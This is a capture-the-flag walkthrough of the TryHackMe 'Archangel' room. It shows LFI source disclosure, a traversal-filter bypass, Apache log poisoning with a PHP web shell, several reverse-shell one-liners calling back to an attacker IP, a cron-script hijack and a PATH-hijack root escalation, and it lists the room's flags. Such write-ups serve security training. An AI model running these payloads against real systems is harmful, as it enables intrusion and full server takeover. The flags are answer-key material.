---
description: Boot2root, Web exploitation, Privilege escalation, LFI
---

# 19  - Archangel (LFI vuln)

Room Link --> [https://tryhackme.com/room/archangel](https://tryhackme.com/room/archangel)

## Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap 10.10.67.103 -sS -T4 -Pn -n -p- -vv --min-rate 10000

# outputs
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
{% endcode %}

#### dirsearch enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
dirsearch -u http://10.10.67.103 -t 100 -x 403 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

# outputs
[14:00:35] 301 -  312B  - /pages  ->  http://10.10.67.103/pages/
[14:00:37] 301 -  313B  - /images  ->  http://10.10.67.103/images/
[14:00:41] 301 -  312B  - /flags  ->  http://10.10.67.103/flags/
[14:00:42] 301 -  313B  - /layout  ->  http://10.10.67.103/layout/
```
{% endcode %}

opening the website we got a domain name: `mafialive.thm` , visiting the page after adding the domain name to our kali /etc/hosts file, we get 1st flag.

`thm{f0und_th3_r1ght_h0st_n4m3}` .

Always try `robots.txt` :) i just naigated to `http://mafialive.thm/robots.txt` and got a `test.php` page which am sure is vulnerable to LFI.

<figure><img src=".gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

Blog on PHP filters --> [http://kaoticcreations.blogspot.com/2011/12/lfi-tip-how-to-read-source-code-using.html](http://kaoticcreations.blogspot.com/2011/12/lfi-tip-how-to-read-source-code-using.html)

The hint says to look at the source code, so we can use the `php://filter/convert.base64-encode/resource` php filter to systematically request for php files from the server in base64 format. We can see from the source code a call is made to view the "mrrobot.php" file. We will view this file 1st.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php

# outputs
 PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==
 # save it in a .txt file and decode it
```
{% endcode %}

<figure><img src=".gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

Now lets view the `test.php` fiel.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

# we save it to a test.txt file and decode it.

<!DOCTYPE HTML>
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>
</html>
```
{% endcode %}

We find the 2nd flag in the source code.

#### Code Analysis

We can see a filter that has been applied through containStr() function to prevent the LFI attacks. This means the view parameter can only include those files which start with “/var/www/html/development\_testing” and it shouldn’t contain the “../..” string which could be abused for path traversal.

A well-known bypass for this filter is to use alternating dots and double-dots “./.././../” or "..//..//"

## Exploitation

Reading local files from the server.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we use this to bypass and view the /etc/passwd file.
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//etc/passwd
```
{% endcode %}

<figure><img src=".gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

We see a  user "Archangel", we could try and view the user.txt file.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//home//archangel//user.txt
```
{% endcode %}

<figure><img src=".gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

#### Gaining RCE

The hint says "Poison", google LFI Poison" and yoou will see many blogs on LFI RCE.

#### Web Shell Via Log Poisoning <a href="#web-shell-via-log-poisoning" id="web-shell-via-log-poisoning"></a>

{% hint style="danger" %}
> The idea behind **log poisoning** is to put some php code (payload) into the logs, and then load them where php will be executed. If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting.
>
> The simplest case would be to change our user-agent string in a such a way that it includes php code, and then include that log file with our LFI.
{% endhint %}

The PHP Payload we are going to use is, **\<?php system($\_GET\[‘cmd’]);?>**\
This execute an external program and display the output. It is a built-in function of PHP **system()** this function accepts the command as a parameter and it outputs the result. There are couple other, read more [here](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/).

We are going to use **Burp Suite** to capture the request, modify the user-agent string, send it back to server. Once it get logged, we can run native commands and get a reverse shell.

This below is our Burp request.

<figure><img src=".gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

Send the request to Repeater and modify the "User Agent" field: i also added a marker (d31ng**:)** so that as the log file grows, we can easily locate our output, either with ctrl-f, or using curl and grep. Send this request to server from Burp. Turn off the "intercept". It should have logged in access.log file.

<figure><img src=".gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

In the browser:

We know that the log files are usually located in `/var/log/apache2 or /var/log/httpd` depending on the os. lests try the 1st one.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//var//log//apache2//access.log
# grep for "dking" and its there.
```
{% endcode %}

**Alternatively we could use curl**:

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log' -H 'User-Agent: <?php system($_GET['cmd']); ?>'
```
{% endcode %}

And we are able to read the access.log files.

<figure><img src=".gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

Time to execute cmds.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# i ran the "id" cmd in the browser.
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log&cmd=id

# or use curl
curl 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=id'
```
{% endcode %}

### RCE

We have to upoad nishang php reverse shell to the server.

`python3 -m http.server 80` -  setup server hosting shell.php.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=wget%20http://10.18.88.214/shell.php
```
{% endcode %}

<figure><img src=".gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

To execute the shell, setup a nc listener:

Then  we just navigate to `http://mafialive.thm/shell.php` - and we get a reverse shell.

<figure><img src=".gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

Another way to get Reverse Shell is to get a php oneliner from payloadallthethings:

`php -r '$sock=fsockopen("10.18.88.214",4445);exec("/bin/sh -i <&3 >&3 2>&3");'` - url encode it and pass it as cmd in the browser.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%31%38%2e%38%38%2e%32%31%34%22%2c%34%34%34%35%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
```
{% endcode %}

### Priv Esc

Lets look for files owned by the "Archangel" user that we can read.

`find / -user archangel -type f -readable -exec ls -al {} ; 2>/dev/null` .

We see a `/opt/helloworld.sh` file that we have read and write permissions over. And it looks like a cronjob. Viewing `cat /etc/crontab` - we see it there (this cron schedule entry specifies that the script `/opt/helloworld.sh` should be executed every minutes by the `archangel` user.

We can edit it with a rev shell and priv esc to "Archangel" user.

{% code overflow="wrap" lineNumbers="true" %}
```bash
printf '#!/bin/bash\n\n/bin/bash -l > bash -i >& /dev/tcp/10.18.88.214/4242 0>&1\n' > /opt/helloworld.sh
```
{% endcode %}

And i got a shell.

<figure><img src=".gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

We find SUID binaries again:

`find / -user root -perm /4000 -exec ls -al {} \; 2>/dev/null` .

And a binary stuck out: `/home/archangel/secret/backup` - when we run file against it, it is an ELF executable binary.

Lets run `strings` against it.

There is a `cp /home/user/archangel/myfiles/* /opt/backupfiles` - among the results.

This means, when the `/home/archangel/secret/backup` binary is executed by us (we have execute permission), it does this: `cp /home/user/archangel/myfiles/* /opt/backupfiles`

Looking at this we see it is calling the `cp` binary and also not the absolute path like `/bin/cp` , this means we can exploit this by creating a fake `cp` binary that executes a reverse shell when its called, and also adding a new path to the PATH env variable.

#### exploitation

```
# in archangel home dir.
echo '/bin/bash' > cp && chmod 777 cp 

# add the path to the PATH env variable.
export PATH=/hom/archangel:$PATH

# now we execute the binary.
/home/archangel/secret/backup

# and we get root.
```

<figure><img src=".gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

Done.

